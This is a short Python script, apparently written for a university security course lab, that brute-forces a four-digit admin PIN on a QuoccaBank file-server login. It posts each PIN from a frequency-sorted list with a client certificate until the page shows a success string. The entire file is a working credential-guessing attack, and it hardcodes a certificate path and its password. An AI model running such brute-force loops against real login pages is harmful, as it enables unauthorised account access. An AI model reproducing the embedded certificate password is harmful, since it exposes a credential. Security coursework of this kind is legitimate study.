from requests_pkcs12 import post

login_url = 'https://files.quoccabank.com/admin'
p12_path = '/Users/bryanle/Downloads/z5361001.p12'
p12_password = 'Qs3/Keg5W3D/kSJJfp9ltw=='

with open('/Users/bryanle/Downloads/four-digit-pin-codes-sorted-by-frequency-withcount.csv', 'r') as file:
    pins = file.read().splitlines()

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Origin': 'https://files.quoccabank.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://files.quoccabank.com/admin',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
}
count = 1
def attempt_login(password):
    pin_access = {
        'pin': password
    }
    response = post(
        login_url,
        headers=headers,
        data=pin_access,
        pkcs12_filename=p12_path,
        pkcs12_password=p12_password
    )
    if 'COMP6443' in response.text:
        print(f"{count} - PIN: {password} works!")
        print(response.text)
        return True
    else:
        print(f"{count} - PIN: {password} doesn't work")
        return False

for pin in pins:
    pin = pin[0:4]
    if attempt_login(pin):
        break
    count += 1